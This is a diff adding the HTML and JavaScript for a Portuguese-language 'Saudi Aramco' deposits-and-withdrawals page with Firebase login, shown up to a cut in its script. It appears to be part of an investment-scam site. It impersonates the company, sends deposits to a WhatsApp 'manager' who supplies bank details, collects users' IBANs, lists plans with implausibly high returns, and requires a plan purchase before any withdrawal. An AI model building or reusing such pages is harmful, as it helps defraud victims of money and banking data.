@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Saudi Aramco — Depositos e Levantamentos</title>
+<link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
+  import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
+  import { getFirestore, doc, getDoc, updateDoc, addDoc, collection, serverTimestamp, query, orderBy, getDocs } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";
+  const firebaseConfig = { apiKey:"AIzaSyDp02RqKrac4ogFRGDcJjPLpA2inOV2rsk", authDomain:"pro-2c872.firebaseapp.com", projectId:"pro-2c872", storageBucket:"pro-2c872.firebasestorage.app", messagingSenderId:"778229616930", appId:"1:778229616930:web:b56177b322241b103ad57b" };
+  const app = initializeApp(firebaseConfig);
+  const auth = getAuth(app); const db = getFirestore(app);
+  window._auth=auth; window._db=db;
+  window._dbFuncs={doc,getDoc,updateDoc,addDoc,collection,serverTimestamp,query,orderBy,getDocs};
+  onAuthStateChanged(auth, async(user)=>{
+    if(!user){window.location.href='auth.html';return;}
+    window._currentUser=user;
+    try {
+      const snap=await getDoc(doc(db,'users',user.uid));
+      if(snap.exists()){window._userData=snap.data();window._userBalance=snap.data().balance||0;}
+    } catch(e){window._userData={};window._userBalance=0;}
+    initPage();
+  });
+</script>
+<style>
+:root{--primary:#007bff;--primary-t:rgba(0,123,255,0.10);--gold:#c8902a;--surface:#ffffff;--surface2:#f4f6fa;--border:#e2e8f0;--text:#1a202c;--text-muted:#64748b;--success:#10b981;--error:#ef4444;--warning:#f59e0b;--orange:#f97316;--nav-h:68px;--radius:16px;--radius-sm:10px;}
+*{margin:0;padding:0;box-sizing:border-box;}
+body{font-family:'Sora',sans-serif;background:#f0f3f9;min-height:100vh;padding-bottom:calc(var(--nav-h) + 16px);color:var(--text);}
+.header{background:var(--surface);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:100;box-shadow:0 2px 16px rgba(0,0,0,0.07);}
+.header-inner{max-width:600px;margin:0 auto;padding:12px 16px;display:flex;align-items:center;gap:12px;}
+.back-btn{width:38px;height:38px;border-radius:10px;background:var(--surface2);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;cursor:pointer;color:var(--text);text-decoration:none;transition:all 0.2s;flex-shrink:0;}
+.back-btn:hover{background:var(--primary-t);color:var(--primary);}
+.back-btn svg{width:18px;height:18px;}
+.header-title{font-size:17px;font-weight:700;color:var(--text);letter-spacing:-0.3px;flex:1;}
+.header-bal{font-size:12px;color:var(--text-muted);text-align:right;}
+.header-bal strong{display:block;font-size:14px;color:var(--text);font-family:'JetBrains Mono',monospace;}
+.main{max-width:600px;margin:0 auto;padding:16px;}
+.action-cards{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px;}
+.action-card{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px 14px;cursor:pointer;transition:all 0.25s;text-align:center;box-shadow:0 2px 12px rgba(0,0,0,0.06);}
+.action-card:hover{transform:translateY(-3px);box-shadow:0 8px 28px rgba(0,0,0,0.10);}
+.action-card.deposito{border-top:3px solid var(--primary);}
+.action-card.levantamento{border-top:3px solid var(--success);}
+.action-card-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center;margin:0 auto 10px;}
+.action-card-icon.dep{background:rgba(0,123,255,0.1);color:var(--primary);}
+.action-card-icon.lev{background:rgba(16,185,129,0.1);color:var(--success);}
+.action-card-icon svg{width:22px;height:22px;}
+.action-card-label{font-size:14px;font-weight:700;color:var(--text);margin-bottom:4px;}
+.action-card-sub{font-size:11px;color:var(--text-muted);}
+.history-toggle-btn{width:100%;padding:13px;background:var(--surface);border:1.5px solid var(--border);border-radius:var(--radius-sm);font-family:'Sora',sans-serif;font-size:13px;font-weight:700;color:var(--text);cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:16px;}
+.history-toggle-btn:hover{border-color:var(--primary);color:var(--primary);background:var(--primary-t);}
+.history-toggle-btn svg{width:16px;height:16px;transition:transform 0.3s;}
+.history-toggle-btn.open svg{transform:rotate(180deg);}
+.history-panel{display:none;background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden;box-shadow:0 2px 12px rgba(0,0,0,0.06);}
+.history-panel.open{display:block;}
+.history-header{padding:14px 16px;border-bottom:1px solid var(--border);}
+.history-title{font-size:14px;font-weight:700;color:var(--text);}
+.history-item{padding:13px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px;}
+.history-item:last-child{border-bottom:none;}
+.history-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0;}
+.history-dot.pending{background:var(--warning);}
+.history-dot.success{background:var(--success);}
+.history-dot.failed{background:var(--error);}
+.history-body{flex:1;min-width:0;}
+.history-desc{font-size:13px;font-weight:600;color:var(--text);}
+.history-meta{font-size:11px;color:var(--text-muted);margin-top:1px;}
+.history-val{font-size:14px;font-weight:700;font-family:'JetBrains Mono',monospace;color:var(--text);}
+.history-empty{padding:28px 16px;text-align:center;color:var(--text-muted);font-size:13px;}
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;height:var(--nav-h);background:rgba(255,255,255,0.92);backdrop-filter:blur(20px);border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-around;padding:0 8px;box-shadow:0 -4px 24px rgba(0,0,0,0.07);z-index:200;}
+.nav-item{display:flex;flex-direction:column;align-items:center;gap:3px;padding:8px 12px;border-radius:12px;cursor:pointer;transition:all 0.2s;text-decoration:none;border:none;background:none;flex:1;}
+.nav-item.active .nav-icon{color:var(--primary);}
+.nav-item.active .nav-label{color:var(--primary);}
+.nav-icon{color:var(--text-muted);display:flex;}
+.nav-icon svg{width:22px;height:22px;}
+.nav-label{font-size:10px;font-weight:600;color:var(--text-muted);}
+.nav-active-dot{width:4px;height:4px;border-radius:50%;background:var(--primary);margin-top:1px;opacity:0;}
+.nav-item.active .nav-active-dot{opacity:1;}
+.modal-overlay{position:fixed;inset:0;z-index:500;background:rgba(10,15,30,0.55);backdrop-filter:blur(8px);display:flex;align-items:flex-end;justify-content:center;animation:fadeIn 0.25s ease;}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+@keyframes slideUp{from{opacity:0;transform:translateY(40px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+.modal-sheet{background:var(--surface);border-radius:22px 22px 0 0;width:100%;max-width:600px;max-height:92vh;overflow-y:auto;box-shadow:0 -8px 48px rgba(0,0,0,0.2);animation:slideUp 0.35s cubic-bezier(0.34,1.56,0.64,1);}
+.modal-handle-wrap{padding:12px 20px 0;display:flex;justify-content:center;}
+.modal-handle{width:36px;height:4px;border-radius:4px;background:var(--border);}
+.modal-header{padding:16px 20px;border-bottom:1px solid var(--border);}
+.modal-title{font-size:18px;font-weight:700;color:var(--text);letter-spacing:-0.3px;}
+.modal-subtitle{font-size:12px;color:var(--text-muted);margin-top:3px;}
+.modal-body{padding:20px;}
+.modal-footer{padding:0 20px 28px;display:flex;gap:10px;}
+.dep-progress{display:flex;align-items:center;margin-bottom:24px;}
+.dep-step{display:flex;flex-direction:column;align-items:center;flex:1;position:relative;}
+.dep-step:not(:last-child)::after{content:'';position:absolute;top:13px;left:calc(50% + 13px);right:calc(-50% + 13px);height:2px;background:var(--border);z-index:0;transition:background 0.3s;}
+.dep-step.done:not(:last-child)::after{background:var(--primary);}
+.dep-circle{width:26px;height:26px;border-radius:50%;border:2px solid var(--border);background:var(--surface);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:var(--text-muted);position:relative;z-index:1;transition:all 0.3s;font-family:'JetBrains Mono',monospace;}
+.dep-step.active .dep-circle{border-color:var(--primary);background:var(--primary);color:white;box-shadow:0 0 0 4px rgba(0,123,255,0.15);}
+.dep-step.done .dep-circle{border-color:var(--success);background:var(--success);color:white;}
+.dep-label{font-size:9px;font-weight:600;color:var(--text-muted);margin-top:5px;text-transform:uppercase;letter-spacing:0.5px;text-align:center;}
+.dep-step.active .dep-label{color:var(--primary);}
+.dep-step.done .dep-label{color:var(--success);}
+.notice-box{background:rgba(0,123,255,0.06);border:1px solid rgba(0,123,255,0.18);border-radius:12px;padding:14px;margin-bottom:16px;}
+.notice-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:8px;display:flex;align-items:center;gap:6px;}
+.notice-title svg{width:15px;height:15px;color:var(--primary);}
+.notice-body{font-size:12px;color:var(--text-muted);line-height:1.7;}
+.notice-body li{margin-left:16px;margin-bottom:4px;}
+.amount-label{font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:8px;}
+.amount-input-wrap{position:relative;margin-bottom:8px;}
+.amount-currency{position:absolute;left:14px;top:50%;transform:translateY(-50%);font-size:16px;font-weight:700;color:var(--text-muted);font-family:'JetBrains Mono',monospace;}
+.amount-input{width:100%;padding:16px 14px 16px 44px;border:2px solid var(--border);border-radius:12px;font-family:'JetBrains Mono',monospace;font-size:22px;font-weight:700;color:var(--text);background:var(--surface);outline:none;transition:all 0.2s;text-align:right;}
+.amount-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(0,123,255,0.1);}
+.amount-hint{font-size:11px;color:var(--text-muted);}
+.plan-match{background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.25);border-radius:10px;padding:10px 14px;margin:10px 0;font-size:12px;color:#065f46;font-weight:600;display:none;align-items:center;gap:8px;}
+.plan-match svg{width:15px;height:15px;color:var(--success);}
+.confirm-grid{border:1.5px solid var(--border);border-radius:12px;overflow:hidden;margin-bottom:14px;}
+.confirm-row{display:flex;justify-content:space-between;align-items:center;padding:11px 14px;border-bottom:1px solid var(--border);}
+.confirm-row:last-child{border:none;}
+.confirm-row:nth-child(even){background:var(--surface2);}
+.confirm-key{font-size:11px;font-weight:700;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.6px;}
+.confirm-val{font-size:13px;font-weight:700;color:var(--text);font-family:'JetBrains Mono',monospace;}
+.confirm-val.green{color:var(--success);}
+.confirm-val.blue{color:var(--primary);}
+.info-box{background:rgba(245,158,11,0.08);border:1px solid rgba(245,158,11,0.25);border-radius:10px;padding:12px 14px;font-size:12px;color:#92400e;line-height:1.55;display:flex;gap:10px;margin-bottom:12px;}
+.info-box svg{width:15px;height:15px;color:#d97706;flex-shrink:0;margin-top:1px;}
+.wd-checks{display:flex;flex-direction:column;gap:14px;margin-bottom:20px;}
+.wd-check{display:flex;align-items:center;gap:14px;padding:14px;background:var(--surface2);border:1px solid var(--border);border-radius:12px;transition:all 0.3s;}
+.wd-check-circle{width:44px;height:44px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;transition:all 0.3s;}
+.wd-check-ring{width:40px;height:40px;border-radius:50%;border:3px solid transparent;border-top-color:var(--primary);position:absolute;animation:spin 0.9s linear infinite;}
+.wd-check-circle.done{border-color:var(--success);background:rgba(16,185,129,0.08);}
+.wd-check-circle.fail{border-color:var(--error);background:rgba(239,68,68,0.08);}
+.wd-check-circle svg{width:20px;height:20px;}
+.wd-check-body{flex:1;}
+.wd-check-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:2px;}
+.wd-check-sub{font-size:11px;color:var(--text-muted);}
+.iban-field{margin-bottom:16px;}
+.iban-label{font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;display:flex;align-items:center;justify-content:space-between;}
+.iban-counter{font-size:11px;color:var(--text-muted);font-family:'JetBrains Mono',monospace;font-weight:600;}
+.iban-row{display:flex;gap:8px;align-items:center;}
+.iban-prefix{padding:12px 10px;background:var(--surface2);border:1.5px solid var(--border);border-radius:var(--radius-sm);font-family:'JetBrains Mono',monospace;font-size:12px;font-weight:700;color:var(--text);white-space:nowrap;flex-shrink:0;}
+.iban-input{flex:1;padding:12px 10px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;color:var(--text);background:var(--surface);outline:none;transition:all 0.2s;}
+.iban-input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(0,123,255,0.1);}
+.iban-input.match{border-color:var(--success);}
+.iban-input.mismatch{border-color:var(--error);}
+.bank-name-row{margin-bottom:16px;}
+.bank-name-row label{font-size:12px;font-weight:700;color:var(--text);text-transform:uppercase;letter-spacing:0.5px;margin-bottom:6px;display:block;}
+.bank-name-row input{width:100%;padding:12px 14px;border:1.5px solid var(--border);border-radius:var(--radius-sm);font-family:'Sora',sans-serif;font-size:13px;color:var(--text);background:var(--surface);outline:none;transition:all 0.2s;}
+.bank-name-row input:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(0,123,255,0.1);}
+.security-box{background:rgba(239,68,68,0.06);border:1px solid rgba(239,68,68,0.2);border-radius:12px;padding:14px;margin-bottom:16px;}
+.security-box-title{font-size:13px;font-weight:700;color:#991b1b;margin-bottom:6px;display:flex;align-items:center;gap:6px;}
+.security-box-title svg{width:15px;height:15px;}
+.security-box-body{font-size:12px;color:#7f1d1d;line-height:1.65;}
+.security-box-body li{margin-left:16px;margin-bottom:3px;}
+.bank-confirmed-box{background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.25);border-radius:12px;padding:16px;margin-bottom:16px;text-align:center;}
+.bank-confirmed-icon{width:48px;height:48px;border-radius:50%;background:rgba(16,185,129,0.15);display:flex;align-items:center;justify-content:center;margin:0 auto 10px;}
+.bank-confirmed-icon svg{width:24px;height:24px;color:var(--success);}
+.bank-confirmed-title{font-size:15px;font-weight:700;color:var(--text);margin-bottom:4px;}
+.bank-confirmed-sub{font-size:12px;color:var(--text-muted);}
+.wd-amount-field{margin-bottom:16px;}
+.btn{width:100%;padding:13px;border:none;border-radius:var(--radius-sm);font-family:'Sora',sans-serif;font-size:14px;font-weight:700;cursor:pointer;transition:all 0.2s;display:flex;align-items:center;justify-content:center;gap:8px;}
+.btn-primary{background:var(--primary);color:white;box-shadow:0 4px 14px rgba(0,123,255,0.28);}
+.btn-primary:hover{background:#0060d9;transform:translateY(-1px);}
+.btn-primary:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
+.btn-outline{background:transparent;color:var(--text-muted);border:1.5px solid var(--border);}
+.btn-outline:hover{border-color:var(--primary);color:var(--primary);background:var(--primary-t);}
+.btn-success{background:var(--success);color:white;box-shadow:0 4px 14px rgba(16,185,129,0.28);}
+.btn-success:hover{background:#059669;transform:translateY(-1px);}
+.btn-success:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
+.btn-wa{background:linear-gradient(135deg,#25d366,#128c7e);color:white;box-shadow:0 4px 14px rgba(37,211,102,0.3);}
+.btn svg{width:16px;height:16px;}
+.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,0.3);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;display:none;}
+.popup-container{position:fixed;top:20px;right:16px;left:16px;z-index:9999;display:flex;flex-direction:column;align-items:flex-end;gap:10px;pointer-events:none;}
+@media(min-width:480px){.popup-container{left:auto;width:340px;}}
+.popup{background:rgba(255,255,255,0.9);backdrop-filter:blur(18px);border:1px solid rgba(255,255,255,0.65);border-radius:14px;padding:13px 15px;box-shadow:0 8px 32px rgba(0,0,0,0.14);display:flex;align-items:flex-start;gap:11px;width:100%;pointer-events:all;transform:translateX(120%);opacity:0;transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1),opacity 0.3s;}
+.popup.show{transform:translateX(0);opacity:1;}
+.popup.hide{transform:translateX(120%);opacity:0;}
+.popup-icon{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.popup-icon svg{width:17px;height:17px;}
+.popup.success .popup-icon{background:rgba(16,185,129,0.15);color:#10b981;}
+.popup.error .popup-icon{background:rgba(239,68,68,0.12);color:#ef4444;}
+.popup.info .popup-icon{background:rgba(0,123,255,0.12);color:#007bff;}
+.popup.warning .popup-icon{background:rgba(245,158,11,0.12);color:#f59e0b;}
+.popup-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:1px;}
+.popup-msg{font-size:12px;color:var(--text-muted);line-height:1.4;}
+.popup-close{background:none;border:none;cursor:pointer;color:var(--text-muted);padding:2px;flex-shrink:0;}
+.popup-close svg{width:13px;height:13px;}
+</style>
+</head>
+<body>
+<div class="popup-container" id="popupContainer"></div>
+
+<header class="header">
+  <div class="header-inner">
+    <a href="index.html" class="back-btn"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M19 12H5M12 19l-7-7 7-7"/></svg></a>
+    <div class="header-title">Depositos e Levantamentos</div>
+    <div class="header-bal">Disponivel<strong id="headerBal">0,00 Kz</strong></div>
+  </div>
+</header>
+
+<main class="main">
+  <div class="action-cards">
+    <div class="action-card deposito" onclick="openDepositModal()">
+      <div class="action-card-icon dep"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div>
+      <div class="action-card-label">Deposito</div>
+      <div class="action-card-sub">Adicionar fundos</div>
+    </div>
+    <div class="action-card levantamento" onclick="openWithdrawFlow()">
+      <div class="action-card-icon lev"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="17 11 12 6 7 11"/><line x1="12" y1="6" x2="12" y2="18"/></svg></div>
+      <div class="action-card-label">Levantamento</div>
+      <div class="action-card-sub">Retirar rendimentos</div>
+    </div>
+  </div>
+  <button class="history-toggle-btn" id="historyToggleBtn" onclick="toggleHistory()">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg>
+    Historico de Saques
+  </button>
+  <div class="history-panel" id="historyPanel">
+    <div class="history-header"><div class="history-title">Historico de Levantamentos</div></div>
+    <div id="historyList"><div class="history-empty">Nenhum levantamento registado ainda.</div></div>
+  </div>
+</main>
+
+<!-- ===== DEPOSIT MODAL ===== -->
+<div class="modal-overlay" id="depositModal" style="display:none" onclick="if(event.target===this)closeDepModal()">
+  <div class="modal-sheet">
+    <div class="modal-handle-wrap"><div class="modal-handle"></div></div>
+    <div class="modal-header">
+      <div class="modal-title" id="depTitle">Realizar Deposito</div>
+      <div class="modal-subtitle" id="depSub">Leia com atencao antes de continuar</div>
+    </div>
+    <div class="modal-body">
+      <div class="dep-progress">
+        <div class="dep-step active" id="dds1"><div class="dep-circle" id="ddc1">1</div><div class="dep-label">Leitura</div></div>
+        <div class="dep-step" id="dds2"><div class="dep-circle" id="ddc2">2</div><div class="dep-label">Valor</div></div>
+        <div class="dep-step" id="dds3"><div class="dep-circle" id="ddc3">3</div><div class="dep-label">Confirmar</div></div>
+      </div>
+
+      <!-- Step 1 -->
+      <div id="depPanel1">
+        <div class="notice-box">
+          <div class="notice-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>Leia com atencao antes de continuar</div>
+          <div class="notice-body"><ul>
+            <li>Os depositos sao processados manualmente pelo gerente via WhatsApp.</li>
+            <li>Apos enviar a mensagem, aguarde a confirmacao bancaria do gerente.</li>
+            <li>So realize depositos para os dados bancarios fornecidos pelo gerente oficial.</li>
+            <li>O valor minimo corresponde ao plano de investimento desejado.</li>
+            <li>Nao realize transferencias sem antes confirmar os dados com o gerente.</li>
+            <li>Apos confirmacao, o plano e ativado em ate 24 horas.</li>
+            <li>A Saudi Aramco nao se responsabiliza por depositos sem confirmacao previa.</li>
+          </ul></div>
+        </div>
+      </div>
+
+      <!-- Step 2 -->
+      <div id="depPanel2" style="display:none">
+        <div class="amount-label">Valor do Deposito</div>
+        <div class="amount-input-wrap">
+          <span class="amount-currency">Kz</span>
+          <input type="tel" inputmode="numeric" class="amount-input" id="depAmountInput" value="0.00" oninput="handleAmountInput(this,'dep')">
+        </div>
+        <div class="amount-hint">Minimo: 3.995,00 Kz (Plano Liquidos de Gas Natural)</div>
+        <div class="plan-match" id="depPlanMatch">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>
+          <span id="depPlanMatchText">—</span>
+        </div>
+      </div>
+
+      <!-- Step 3 -->
+      <div id="depPanel3" style="display:none">
+        <div class="confirm-grid">
+          <div class="confirm-row"><span class="confirm-key">Nome</span><span class="confirm-val" id="depCName">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">ID Conta</span><span class="confirm-val blue" id="depCId">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">Valor</span><span class="confirm-val green" id="depCVal">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">Plano</span><span class="confirm-val" id="depCPlan">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">Telefone</span><span class="confirm-val" id="depCTel">—</span></div>
+        </div>
+        <div class="info-box">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Ao clicar em "Falar com Gerente", sera aberto o WhatsApp com a mensagem ja preenchida. Aguarde a resposta antes de efetuar qualquer transferencia.
+        </div>
+      </div>
+    </div>
+    <div class="modal-footer">
+      <button class="btn btn-outline" id="depBtnBack" style="display:none;flex:1" onclick="depBack()">Voltar</button>
+      <button class="btn btn-primary" id="depBtnNext" style="flex:2" onclick="depNext()">
+        <span id="depBtnTxt">Entendi, Continuar</span>
+        <div class="spinner" id="depSpinner"></div>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ===== WITHDRAW MODAL ===== -->
+<div class="modal-overlay" id="withdrawModal" style="display:none" onclick="if(event.target===this)closeWdModal()">
+  <div class="modal-sheet">
+    <div class="modal-handle-wrap"><div class="modal-handle"></div></div>
+    <div class="modal-header">
+      <div class="modal-title" id="wdTitle">Levantamento</div>
+      <div class="modal-subtitle" id="wdSub">A verificar a sua conta...</div>
+    </div>
+    <div class="modal-body" id="wdBody">
+      <!-- Checking phase -->
+      <div id="wdChecks">
+        <div class="wd-checks">
+          <div class="wd-check" id="wdCheck1">
+            <div class="wd-check-circle" id="wdCircle1"><div class="wd-check-ring"></div></div>
+            <div class="wd-check-body">
+              <div class="wd-check-title">Investimento Ativo</div>
+              <div class="wd-check-sub" id="wdSub1">A verificar o seu plano de investimento...</div>
+            </div>
+          </div>
+          <div class="wd-check" id="wdCheck2">
+            <div class="wd-check-circle" id="wdCircle2"><div class="wd-check-ring"></div></div>
+            <div class="wd-check-body">
+              <div class="wd-check-title">Conta Bancaria</div>
+              <div class="wd-check-sub" id="wdSub2">A verificar dados bancarios...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <!-- Bank link form -->
+      <div id="wdBankForm" style="display:none">
+        <div class="security-box">
+          <div class="security-box-title"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>Aviso de Seguranca Importante</div>
+          <div class="security-box-body"><ul>
+            <li>Insira apenas o seu IBAN pessoal e intransmissivel.</li>
+            <li>Verifique cada digito com cuidado antes de confirmar.</li>
+            <li>Apos guardar, os dados nao serao visiveis por razoes de seguranca.</li>
+            <li>A Saudi Aramco nunca solicita dados bancarios por outro meio.</li>
+            <li>Em caso de duvida contacte o suporte antes de continuar.</li>
+          </ul></div>
+        </div>
+        <div class="bank-name-row">
+          <label>Nome do Banco</label>
+          <input type="text" id="bankName" placeholder="Ex: Banco BAI, BFA, BPC...">
+        </div>
+        <div class="iban-field">
+          <div class="iban-label">IBAN <span class="iban-counter" id="ibanCount1">0/21</span></div>
+          <div class="iban-row">
+            <div class="iban-prefix">AO06</div>
+            <input type="tel" inputmode="numeric" class="iban-input" id="ibanInput1" placeholder="0000.0000.0000.0000.0000.0" maxlength="25" oninput="handleIban(1)">
+          </div>
+        </div>
+        <div class="iban-field">
+          <div class="iban-label">Confirmar IBAN <span class="iban-counter" id="ibanCount2">0/21</span></div>
+          <div class="iban-row">
+            <div class="iban-prefix">AO06</div>
+            <input type="tel" inputmode="numeric" class="iban-input" id="ibanInput2" placeholder="0000.0000.0000.0000.0000.0" maxlength="25" oninput="handleIban(2)">
+          </div>
+        </div>
+        <div class="info-box">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+          O botao de confirmar so fica activo quando os dois campos de IBAN coincidirem exactamente.
+        </div>
+      </div>
+      <!-- Bank confirmed -->
+      <div id="wdBankOk" style="display:none">
+        <div class="bank-confirmed-box">
+          <div class="bank-confirmed-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg></div>
+          <div class="bank-confirmed-title">Conta Bancaria Vinculada</div>
+          <div class="bank-confirmed-sub">Os seus dados bancarios estao registados de forma segura.</div>
+        </div>
+        <div class="amount-label">Valor do Levantamento</div>
+        <div class="amount-input-wrap" style="margin-bottom:8px">
+          <span class="amount-currency">Kz</span>
+          <input type="tel" inputmode="numeric" class="amount-input" id="wdAmountInput" value="0.00" oninput="handleAmountInput(this,'wd')">
+        </div>
+        <div class="amount-hint" style="margin-bottom:16px">Minimo: 100,00 Kz | Disponivel: <strong id="wdAvail">0,00 Kz</strong></div>
+        <div class="confirm-grid">
+          <div class="confirm-row"><span class="confirm-key">Nome</span><span class="confirm-val" id="wdCName">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">ID Conta</span><span class="confirm-val blue" id="wdCId">—</span></div>
+          <div class="confirm-row"><span class="confirm-key">Valor</span><span class="confirm-val green" id="wdCVal">0,00 Kz</span></div>
+          <div class="confirm-row"><span class="confirm-key">Banco</span><span class="confirm-val" id="wdCBank">—</span></div>
+        </div>
+      </div>
+      <!-- No investment -->
+      <div id="wdNoInv" style="display:none">
+        <div class="info-box">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          Nao possui nenhum plano de investimento ativo. Adquira um plano na secao de Compras para comecar a gerar rendimentos.
+        </div>
+      </div>
+    </div>
+    <div class="modal-footer" id="wdFooter" style="display:none">
+      <button class="btn btn-outline" style="flex:1" onclick="closeWdModal()">Cancelar</button>
+      <button class="btn btn-success" id="wdConfirmBtn" style="flex:2;display:none" onclick="submitWithdraw()">
+        <span id="wdConfirmTxt">Solicitar Levantamento</span>
+        <div class="spinner" id="wdSpinner"></div>
+      </button>
+      <button class="btn btn-primary" id="wdSaveBankBtn" style="flex:2;display:none" disabled onclick="saveBank()">
+        <span>Guardar Conta Bancaria</span>
+        <div class="spinner" id="bankSpinner"></div>
+      </button>
+      <a href="compras.html" class="btn btn-primary" id="wdGoBuyBtn" style="flex:2;display:none;text-decoration:none">Ver Planos</a>
+    </div>
+  </div>
+</div>
+
+<nav class="bottom-nav">
+  <a href="index.html" class="nav-item"><div class="nav-icon"><svg viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg></div><div class="nav-label">Inicio</div><div class="nav-active-dot"></div></a>
+  <a href="compras.html" class="nav-item"><div class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="9" cy="21" r="1"/><circle cx="20" cy="21" r="1"/><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"/></svg></div><div class="nav-label">Compras</div><div class="nav-active-dot"></div></a>
+  <a href="dl.html" class="nav-item active"><div class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"/></svg></div><div class="nav-label">DL</div><div class="nav-active-dot"></div></a>
+  <a href="tarefas.html" class="nav-item"><div class="nav-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 11 12 14 22 4"/><path d="M21 12v7a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h11"/></svg></div><div class="nav-label">Tarefas</div><div class="nav-active-dot"></div></a>
+</nav>
+
+<script>
+const PLANS=[{name:'Liquidos de Gas Natural',price:3995,income:240},{name:'Asfalto (Paving Asphalt)',price:6595,income:350},{name:'Enxofre (Sulfur)',price:8395,income:500},{name:'Produtos Petroquimicos',price:15295,income:1100},{name:'Gas Liquefeito de Petroleo',price:24100,income:1950},{name:'Combustivel de Aviacao',price:50000,income:3250},{name:'Diesel',price:79900,income:5800}];
+
